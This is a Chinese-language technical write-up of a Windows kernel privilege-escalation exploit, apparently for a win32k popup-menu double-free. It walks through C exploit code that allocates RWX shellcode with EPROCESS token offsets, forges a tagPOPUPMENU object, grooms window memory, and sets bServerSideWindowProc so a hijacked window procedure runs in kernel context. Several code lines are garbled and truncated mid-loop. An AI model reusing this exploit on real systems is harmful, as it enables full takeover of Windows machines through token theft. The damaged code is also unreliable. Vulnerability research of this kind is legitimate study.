## 准备工作
    typedef struct _SHELLCODE {
        DWORD reserved;
        DWORD pid;
        DWORD off_CLS_lpszMenuName;
        DWORD off_THREADINFO_ppi;
        DWORD off_EPROCESS_ActiveLink;
        DWORD off_EPROCESS_Token;
        PVOID tagCLS[0x100];
        BYTE  pfnWindProc[];
    } SHELLCODE, * PSHELLCODE;
    static PSHELLCODE pvShellCode = NULL;
        pvShellCode = (PSHELLCODE)VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (pvShellCode == NULL)
        {
            return 0;
        }
        ZeroMemory(pvShellCode, 0x1000);
        pvShellCode->pid = GetCurrentProcessId();
        pvShellCode->off_CLS_lpszMenuName = 0x050;
        pvShellCode->off_THREADINFO_ppi = 0x0b8;
        pvShellCode->off_EPROCESS_ActiveLink = 0x0b8;
        pvShellCode->off_EPROCESS_Token = 0x0f8;
        CopyMemory(pvShellCode->pfnWindProc, xxPayloadWindProc, sizeof(xxPayloadWindProc));
首先在用户进程中分配完整内存页的`RWX`内存块，并初始化相关成员域，将 ShellCode 函数代码拷贝到从成员域 pfnWindProc
起始的内存地址。
## 伪造根弹出菜单对象
    DWORD dwPopupFake[0xD] = { 0 };
        dwPopupFake[0x0] = (DWORD)0x00098208;  //->flags
        dwPopupFake[0x1] = (DWORD)pvHeadFake;  //->spwndNotify
        dwPopupFake[0x2] = (DWORD)pvHeadFake;  //->spwndPopupMenu
        dwPopupFake[0x3] = (DWORD)pvHeadFake;  //->spwndNextPopup
        dwPopupFake[0x4] = (DWORD)pvAddrFlags - 4; //->spwndPrevPopup
        dwPopupFake[0x5] = (DWORD)pvHeadFake;  //->spmenu
        dwPopupFake[0x6] = (DWORD)pvHeadFake;  //->spmenuAlternate
        dwPopupFake[0x7] = (DWORD)pvHeadFake;  //->spwndActivePopup
        dwPopupFake[0x8] = (DWORD)0xFFFFFFFF;  //->ppopupmenuRoot
        dwPopupFake[0x9] = (DWORD)pvHeadFake;  //->ppmDelayedFree
        dwPopupFake[0xA] = (DWORD)0xFFFFFFFF;  //->posSelectedItem
        dwPopupFake[0xB] = (DWORD)pvHeadFake;  //->posDropped
        dwPopupFake[0xC] = (DWORD)0;
        for (UINT i = 0; i deskhead.pSelf + 0xb0 + 4;
    pvHeadFake = pbExtra + 0x44;
    for (UINT x = 0; x thread.pti;
    SetWindowLongW(hWindowHunt, 0x50, (LONG)pti); // pti
将载体窗口对象的扩展区域预留 4 字节，将剩余 0x1FC 字节的内存区域全部填充为扩展区域 +0x04
字节偏移的地址，填充的数值将作为各种伪造对象的句柄、引用计数或对象指针成员域。接下来将剩余内存区域 +0x44
字节偏移的内存数据作为伪造的内核用户对象头部结构，其地址被作为伪造的根弹出菜单 tagPOPUPMENU 对象的各个指针成员域的值。
## 内核代码执行
窗口结构体 tagWND 对象的成员标志位 bServerSideWindowProc
是一个特殊标志位，该标志位决定所属窗口对象的消息处理函数属于服务端还是客户端。如果该标志置位的话，函数会直接使当前线程在内核上下文调用目标窗口对象的消息处理函数。如果我们将未置位的窗口置位并劫持消息处理函数的话的话，便可以将我们设置的函数在内核上下文中执行。  
该成员位于tagWND对象的第18比特位，标志位 bDialogWindow 的位置是 bServerSideWindowProc
所在字节的起始比特位。通过研究发现，在创建普通窗口对象时，如果样式参数 dwStyle 和扩展样式参数 dwExStyle 都传值为 `0`
默认值，那么在内核中成员域 bDialogWindow 和 bHasCreatestructName
都将未被置位。因此可以借助这个特性，实现对目标关键标志位的置位。
    pvAddrFlags = *(PBYTE*)((PBYTE)xxHMValidateHandle(hWindowHunt) + 0x10) + 0x16;
        SetWindowLongW(hWindowHunt, GWL_WNDPROC, (LONG)pvShellCode->pfnWindProc);
获得bDialogWindow的地址，再设置准备工作中设置的pfnWindProc成员域为hWindowHunt的消息处理函数。
    dwPopupFake[0x4] = (DWORD)pvAddrFlags - 4; //->spwndPrevPopup
设置bDialogWindow的减四字节作为构造的tagPOPUPMENU对象的某个窗口对象指针成员域，这样刚刚提到的三个标志位正好位于该指针该指针成员域指向的窗口对象的锁计数成员域cLockObj的低3比特位，这样的话在`xxxMNEndMenu`函数对该成员域解锁的时候，会对bDialogWindow起始的32位数值自减，这会导致三个标志位都为1，从而获得hook的消息处理函数在内核上下文执行的机会。
## shellcode
第二次释放的根弹出菜单对象实际上是批量创建的普通窗口对象中某个窗口对象所属窗口类 tagCLS 对象的成员域 lpszMenuName
指向的缓冲区。这将导致在进程退出时销毁用户对象期间，系统在内核中释放目标窗口类对象成员域 lpszMenuName 时引发重复释放的异常。
    static constexpr UINT num_offset_WND_pcls = 0x64;
    for (INT i = 0; i tagCLS[i] = *(PVOID *)((PBYTE)xxHMValidateHandle(hWindowList[i]) + num_offset_WND_pcls);
    }